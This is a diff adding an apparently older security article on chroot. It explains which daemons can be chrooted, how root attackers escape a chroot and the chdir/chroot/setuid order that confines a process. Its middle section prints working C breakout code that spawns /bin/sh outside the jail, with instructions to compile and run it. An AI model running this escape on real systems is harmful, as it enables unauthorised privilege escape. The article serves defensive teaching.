@@ -1,0 +1,130 @@
+
+
+
+
+			 SECURING CHROOT
+
+
+
+Chroot is often used as a security measure (eg for anonymous FTP,
+DNS server). People also suggest chrooting: telnet/ssh into their
+home directories, so they can only update their webpages; web
+servers.
+
+SMAP secure email wrapper from FWTK (Firewall Toolkit) runs chrooted
+to the mail directory.
+
+What daemons can be chrooted?
+
+If a daemon has to access files that are not easily collectible in
+one place, chrooting it will be harder.
+
+For example, sendmail needs mail spool (/var/spool/mail), other
+files in spool (such as mqueue), user's home directories and system
+configuration files in /etc/. There is no place on the filesystem
+where sendmail can effectively be confined. Of course makeshift
+solutions are possible, but it is not clear that it will add to
+security or lax it. if sendmail functionality is separated into a
+spool daemon and mail transfer program (like done in FWTK smap and
+smapd) then chrooting is entirely possible.
+
+Chrooting shell users is possible if there is a business need to
+keep them in some particular directory.
+
+Anything else, such as bind, apache, squid can be chrooted; but
+sometimes the benefits are unclear.
+
+"What daemon should be chrooted?" is an entirely different question
+from "What daemons could be chrooted?".
+
+Before we answer that lets analye how attackers break out of a
+chroot.
+
+First the more software is deployed within the chroot environment,
+the more dangerous it becomes.
+
+Second, the number of ways that a root user can break out of a
+chroot is huge. Starting from simple use of a chroot() call with
+no chdir() [see sample code below] to esoteric methods like the
+creation of your own /dev/hda or /dev/kmem devices, injection code
+into the running kernel, using open directory handles outside the
+chroot or chroot-breaking buffer overflows. While system capabilities
+can be used to render inoperable many of these methods, new ones
+will likely be found by smart attackers.
+
+Sample code to break out of a chroot.
+
+	#include <stdlib.h> 
+
+	#include <stdio.h> 
+
+	#include <unistd.h>
+
+	#include <sys/stat.h> 
+
+	#include <sys/types.h>
+
+	int main(void) {
+
+		int i;
+
+		mkdir("breakout", 0700); 
+
+		chroot("breakout"); 
+
+		for (i=0; i<100; i++)
+
+			chdir("..");
+
+		chroot("."); 
+
+		execl("/bin/sh", "/bin/sh", NULL);
+
+	}
+
+
+Compile the above code (with "gcc -static") and run within the
+chrooted directory (after doing "chroot ." or similar from shell
+prompt) to escape.
+
+Third, if there is no root user defined within the chroot environment,
+no SUID binaries, no devices, and the daemon itself dropped root
+privileges right after calling chroot() call (like in the code
+below), breaking out of a chroot appears to be impossible. In other
+words, if there is no way to gain a root shell or perform certain
+actions that only root can perform (eg create devices, or access
+raw memory) breaking a chroot is not clearly possible.
+
+Ideally, if the custom software uses chroot for security the sequence
+of calls should be:
+
+
+	chdir("/home/safedir");
+
+	chroot("/home/safedir");
+
+	setuid(500);
+
+
+Remember, that after your program executes the above code there
+will be no way for the program to regain root privileges.
+
+Fourth, in some cases attackers might not be able to break (ie run
+processes outside of chrooted directory), but instead will be able
+to somewhat affect such processes.
+
+For example, if bind is chrooted, several devices should be created.
+One of them is /dev/log, necessary for logging bind messages into
+the regular system logs. By crafting a malicious log message and
+sending it to /dev/log from within a chrooted directory attacker
+will influence the behaviour of the syslogd running outside the
+chroot. If there is a buffer overflow bug in the host's syslogd
+(which runs as root) additional privileges can be obtained.
+
+Daemons which don't drop root privileges while running or programs
+that provides root shell access (sshd, telnet with a root account
+within the chrooted directory) bring no valuable security outcome.
+
+
+
+
